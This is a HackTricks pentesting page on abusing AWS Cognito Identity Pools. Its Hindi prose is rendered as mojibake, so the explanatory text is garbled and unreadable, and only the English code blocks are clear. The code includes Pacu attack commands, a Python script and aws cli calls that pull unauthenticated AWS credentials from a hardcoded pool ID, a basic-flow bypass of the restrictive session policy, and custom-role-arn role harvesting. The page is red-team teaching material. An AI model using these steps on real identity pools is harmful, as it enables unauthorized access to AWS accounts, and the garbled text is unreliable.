# Cognito Identity Pools

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

рдкрд╣рдЪрд╛рди рдкреВрд▓ рдЖрдкрдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ **рдЕрд╕реНрдерд╛рдпреА рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдореЗрдВ рд╕рдХреНрд╖рдо рдмрдирд╛рдХрд░ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рднреВрдорд┐рдХрд╛ рдирд┐рднрд╛рддреЗ рд╣реИрдВред рдпреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╡рд┐рднрд┐рдиреНрди AWS рд╕реЗрд╡рд╛рдУрдВ, рдЬрд┐рд╕рдореЗрдВ Amazon S3 рдФрд░ DynamoDB рд╢рд╛рдорд┐рд▓ рд╣реИрдВ, рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИрдВред рдкрд╣рдЪрд╛рди рдкреВрд▓реЛрдВ рдХреА рдПрдХ рдЙрд▓реНрд▓реЗрдЦрдиреАрдп рд╡рд┐рд╢реЗрд╖рддрд╛ рдпрд╣ рд╣реИ рдХрд┐ рд╡реЗ рдЧреБрдордирд╛рдо рдЕрддрд┐рдерд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛рдУрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВред рд╕рдорд░реНрдерд┐рдд рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

* Amazon Cognito рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреВрд▓
* рдлреЗрд╕рдмреБрдХ, рдЧреВрдЧрд▓, Amazon рдХреЗ рд╕рд╛рде рд▓реЙрдЧрд┐рди, рдФрд░ Apple рдХреЗ рд╕рд╛рде рд╕рд╛рдЗрди рдЗрди рдЬреИрд╕реЗ рд╕рд╛рдорд╛рдЬрд┐рдХ рд╕рд╛рдЗрди-рдЗрди рд╡рд┐рдХрд▓реНрдк
* OpenID рдХрдиреЗрдХреНрдЯ (OIDC) рдХреЗ рд╕рд╛рде рдЕрдиреБрдкрд╛рд▓рди рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рджрд╛рддрд╛
* SAML (рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА рдЕрд╕реЗрд░реНрд╢рди рдорд╛рд░реНрдХрдЕрдк рд▓реИрдВрдЧреНрд╡реЗрдЬ) рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛
* рдбреЗрд╡рд▓рдкрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкрд╣рдЪрд╛рди
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

Identity Pool рд╕рддреНрд░ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдкрд╣рд▓реЗ **рдПрдХ рдкрд╣рдЪрд╛рди ID рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**ред рдпрд╣ рдкрд╣рдЪрд╛рди ID **рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╕рддреНрд░ рдХреА рдкрд╣рдЪрд╛рди рд╣реИ**ред рдЗрди рдкрд╣рдЪрд╛рдиреЛрдВ рдореЗрдВ 20 рддрдХ рдбреЗрдЯрд╛ рд╕реЗрдЯ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ 1MB рддрдХ рдХреА рдХреБрдВрдЬреА-рдореВрд▓реНрдп рдЬреЛрдбрд╝реЗ рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣ **рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЬрд╛рдирдХрд╛рд░реА рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИ** (рдЬреЛ рд╣рдореЗрд╢рд╛ рдЙрд╕реА рдкрд╣рдЪрд╛рди ID рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛)ред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╕реЗрд╡рд╛ **cognito-sync** рд╡рд╣ рд╕реЗрд╡рд╛ рд╣реИ рдЬреЛ **рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдкреНрд░рдмрдВрдзрди рдФрд░ рд╕рдордиреНрд╡рдп рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ** (рдбреЗрдЯрд╛ рд╕реЗрдЯ рдореЗрдВ, рдзрд╛рд░рд╛рдУрдВ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рднреЗрдЬрдирд╛ рдФрд░ SNS рд╕рдВрджреЗрд╢...)ред

### Tools for pentesting

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), AWS рд╢реЛрд╖рдг рдврд╛рдВрдЪрд╛, рдЕрдм "cognito\_\_enum" рдФрд░ "cognito\_\_attack" рдореЙрдбреНрдпреВрд▓ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдПрдХ рдЦрд╛рддреЗ рдореЗрдВ рд╕рднреА Cognito рд╕рдВрдкрддреНрддрд┐рдпреЛрдВ рдХреА рдЧрдгрдирд╛ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдХрдордЬреЛрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ рдЬреЛ рдкрд╣реБрдБрдЪ рдирд┐рдпрдВрддреНрд░рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИрдВ, рдЖрджрд┐ рдХреЛ рдЪрд┐рд╣реНрдирд┐рдд рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд┐рд░реНрдорд╛рдг (MFA рд╕рдорд░реНрдерди рд╕рд╣рд┐рдд) рдФрд░ рдкрд░рд┐рд╡рд░реНрддрдиреАрдп рдХрд╕реНрдЯрдо рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ, рдЙрдкрдпреЛрдЧ рдпреЛрдЧреНрдп рдкрд╣рдЪрд╛рди рдкреВрд▓ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕, ID рдЯреЛрдХрди рдореЗрдВ рдЧреНрд░рд╣рдгреАрдп рднреВрдорд┐рдХрд╛рдУрдВ рдЖрджрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдХреЛ рднреА рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИред

рдореЙрдбреНрдпреВрд▓ рдХреЗ рдХрд╛рд░реНрдпреЛрдВ рдХрд╛ рд╡рд┐рд╡рд░рдг рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП [рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2) рдХреЗ рднрд╛рдЧ 2 рдХреЛ рджреЗрдЦреЗрдВред рд╕реНрдерд╛рдкрдирд╛ рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреЗ рд▓рд┐рдП рдореБрдЦреНрдп [Pacu](https://github.com/RhinoSecurityLabs/pacu) рдкреГрд╖реНрда рджреЗрдЦреЗрдВред

#### Usage

рдПрдХ рджрд┐рдП рдЧрдП рдкрд╣рдЪрд╛рди рдкреВрд▓ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреВрд▓ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рдЦрд┐рд▓рд╛рдл рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд┐рд░реНрдорд╛рдг рдФрд░ рд╕рднреА рдкреНрд░рд┐рд╡реЗрд╕реНрдХ рд╡реЗрдХреНрдЯрд░ рдХреЗ рдкреНрд░рдпрд╛рд╕ рдХреЗ рд▓рд┐рдП рдирдореВрдирд╛ cognito\_\_attack рдЙрдкрдпреЛрдЧ:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
рдирдореВрдирд╛ cognito\_\_enum рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд░реНрддрдорд╛рди AWS рдЦрд╛рддреЗ рдореЗрдВ рджреГрд╢реНрдп рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреВрд▓, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреВрд▓ рдХреНрд▓рд╛рдЗрдВрдЯ, рдкрд╣рдЪрд╛рди рдкреВрд▓, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрджрд┐ рдПрдХрддреНрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) рдПрдХ CLI рдЯреВрд▓ рд╣реИ рдЬреЛ рдкрд╛рдпрдерди рдореЗрдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдпрд╣ Cognito рдкрд░ рд╡рд┐рднрд┐рдиреНрди рд╣рдорд▓реЛрдВ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдЕрд╡рд╛рдВрдЫрд┐рдд рдЦрд╛рддрд╛ рдирд┐рд░реНрдорд╛рдг рдФрд░ рдкрд╣рдЪрд╛рди рдкреВрд▓ рд╡реГрджреНрдзрд┐ рд╢рд╛рдорд┐рд▓ рд╣реИред

#### Installation
```bash
$ pip install cognito-scanner
```
#### рдЙрдкрдпреЛрдЧ
```bash
$ cognito-scanner --help
```
For more information check https://github.com/padok-team/cognito-scanner

## Accessing IAM Roles

### Unauthenticated

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **AWS рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ Cognito рдРрдк рдореЗрдВ рдЕрдирдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЗрд╡рд▓ **Identity Pool ID** рдЬрд╛рдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рдФрд░ рдпрд╣ **ID рдХреЛ рд╡реЗрдм/рдореЛрдмрд╛рдЗрд▓** **рдРрдкреНрд▓рд┐рдХреЗрд╢рди** рдореЗрдВ рд╣рд╛рд░реНрдбрдХреЛрдб рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдПрдХ ID рдЗрд╕ рддрд░рд╣ рджрд┐рдЦрддреА рд╣реИ: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (рдпрд╣ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рдирд╣реАрдВ рд╣реИ)ред

{% hint style="success" %}
**IAM Cognito рдЕрдирдзрд┐рдХреГрдд рднреВрдорд┐рдХрд╛ рдЬреЛ рдмрдирд╛рдИ рдЧрдИ рд╣реИ рдЙрд╕реЗ** рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `Cognito_<Identity Pool name>Unauth_Role` рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред
{% endhint %}

рдпрджрд┐ рдЖрдк рдПрдХ рд╣рд╛рд░реНрдбрдХреЛрдбреЗрдб Identity Pools ID рдкрд╛рддреЗ рд╣реИрдВ рдФрд░ рдпрд╣ рдЕрдирдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рддреЛ рдЖрдк AWS рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
рдпрд╛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд **aws cli commands** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдПрдХ рдЕрдирдзрд┐рдХреГрдд cognito **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХреЛрдИ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рдорд┐рд▓ рд╕рдХрддреА, рднрд▓реЗ рд╣реА рдЗрд╕реЗ рдПрдХ рдиреАрддрд┐ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реМрдВрдкрд╛ рдЧрдпрд╛ рд╣реЛ**ред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрднрд╛рдЧ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред
{% endhint %}

### Enhanced vs Basic Authentication flow

рдкрд┐рдЫрд▓реЗ рдЕрдиреБрднрд╛рдЧ рдиреЗ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдВрд╡рд░реНрдзрд┐рдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рд╡рд╛рд╣** рдХрд╛ рдкрд╛рд▓рди рдХрд┐рдпрд╛ред рдпрд╣ рдкреНрд░рд╡рд╛рд╣ IAM рднреВрдорд┐рдХрд╛ рд╕рддреНрд░ рдХреЗ рд▓рд┐рдП рдПрдХ **рдкреНрд░рддрд┐рдмрдВрдзрд╛рддреНрдордХ** [**рд╕рддреНрд░ рдиреАрддрд┐**](../../aws-basic-information/#session-policies) рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдиреАрддрд┐ рдХреЗрд╡рд▓ рд╕рддреНрд░ рдХреЛ [**рдЗрд╕ рд╕реВрдЪреА рд╕реЗ рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧреА (рднрд▓реЗ рд╣реА рднреВрдорд┐рдХрд╛ рдХреЛ рдЕрдиреНрдп рд╕реЗрд╡рд╛рдУрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛ)ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕реЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рд╣реИ, рдпрджрд┐ **рдкрд╣рдЪрд╛рди рдкреВрд▓ рдореЗрдВ "рдмреЗрд╕рд┐рдХ (рдХреНрд▓рд╛рд╕рд┐рдХ) рдкреНрд░рд╡рд╛рд╣" рд╕рдХреНрд╖рдо рд╣реИ**, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЙрд╕ рдкреНрд░рд╡рд╛рд╣ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╕рддреНрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ **рд╡рд╣ рдкреНрд░рддрд┐рдмрдВрдзрд╛рддреНрдордХ рд╕рддреНрд░ рдиреАрддрд┐ рдирд╣реАрдВ рд╣реЛрдЧреА**ред

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
рдпрджрд┐ рдЖрдкрдХреЛ рдпрд╣ **рддреНрд░реБрдЯрд┐** рдорд┐рд▓рддреА рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рд╣реИ рдХрд┐ **рдмреБрдирд┐рдпрд╛рджреА рдкреНрд░рд╡рд╛рд╣ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реИ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ)**

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

IAM рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХрд╛ рдПрдХ рд╕реЗрдЯ рд╣реЛрдиреЗ рдкрд░ рдЖрдкрдХреЛ [рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреМрди рд╕рд╛ рдПрдХреНрд╕реЗрд╕ рд╣реИ](../../#whoami) рдФрд░ [рдЕрдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ](../../aws-privilege-escalation/).

### рдкреНрд░рдорд╛рдгрд┐рдд

{% hint style="info" %}
рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ **рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ** рдХреЛ рд╢рд╛рдпрдж **рд╡рд┐рднрд┐рдиреНрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рджреА рдЬрд╛рдПрдБрдЧреА, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдк **рдРрдк рдХреЗ рдЕрдВрджрд░ рд╕рд╛рдЗрди рдЕрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдРрд╕рд╛ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ рдФрд░ рдирдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
{% endhint %}

**рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдкрд╣рдЪрд╛рди рдкреВрд▓** рдореЗрдВ рднреА **рднреВрдорд┐рдХрд╛рдПрдБ** рдЙрдкрд▓рдмреНрдз рд╣реЛ рд╕рдХрддреА рд╣реИрдВред

рдЗрд╕рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛** рддрдХ рдкрд╣реБрдБрдЪ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред рдпрджрд┐ рд╡рд╣ рдПрдХ **Cognito User Pool** рд╣реИ, рддреЛ рд╢рд╛рдпрдж рдЖрдк рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдЦреБрдж рдПрдХ рдирдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред

{% hint style="success" %}
**IAM Cognito рдкреНрд░рдорд╛рдгрд┐рдд рднреВрдорд┐рдХрд╛ рдЬреЛ рдмрдирд╛рдИ рдЧрдИ рд╣реИ** рдЙрд╕реЗ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `Cognito_<Identity Pool name>Auth_Role` рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред
{% endhint %}

рд╡реИрд╕реЗ рднреА, **рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг** рдпрд╣ рдЕрдкреЗрдХреНрд╖рд╛ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЖрдкрдиреЗ рдкрд╣рд▓реЗ рд╣реА **Cognito User Pool** рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд┐рдпрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдкрд╣рдЪрд╛рди рдкреВрд▓ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ (рдпрд╣ рди рднреВрд▓реЗрдВ рдХрд┐ рдЕрдиреНрдп рдкреНрд░рдХрд╛рд░ рдХреЗ рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛ рднреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ)ред

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# рдкрд┐рдЫрд▓реЗ рдХрдорд╛рдВрдб рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╕реЗ identity_id рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# IdToken рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ User Pool Groups рдХреЗ рдХрд╛рд░рдг рдХреМрди рд╕реА рднреВрдорд┐рдХрд╛рдПрдБ рдкреНрд░рд╛рдкреНрдд рд╣реИрдВ
# рд╡рд┐рд╢рд┐рд╖реНрдЯ рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП --custom-role-arn рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╡рд┐рднрд┐рдиреНрди IAM рднреВрдорд┐рдХрд╛рдПрдБ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХреА рдЬрд╛рдПрдБ** рдЬрд┐рдирдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд▓реЙрдЧ рдЗрди рд╣реЛ рд░рд╣рд╛ рд╣реИ рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** (рджрд╛рд╡реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ) рдХреЗ рдЖрдзрд╛рд░ рдкрд░ред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рд╣реА рдпрд╛ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рджрд╛рддрд╛рдУрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд┐рднрд┐рдиреНрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рддрдХ рдкрд╣реБрдБрдЪ рд╣реИ, рддреЛ **рд▓реЙрдЧ рдЗрди рдХрд░рдирд╛ рдФрд░ рдЙрдирдХреЗ рд╕рднреА IAM рднреВрдорд┐рдХрд╛рдУрдВ рддрдХ рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдлрд╛рдпрджреЗрдордВрдж рд╣реЛ рд╕рдХрддрд╛ рд╣реИ**ред
{% endhint %}

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
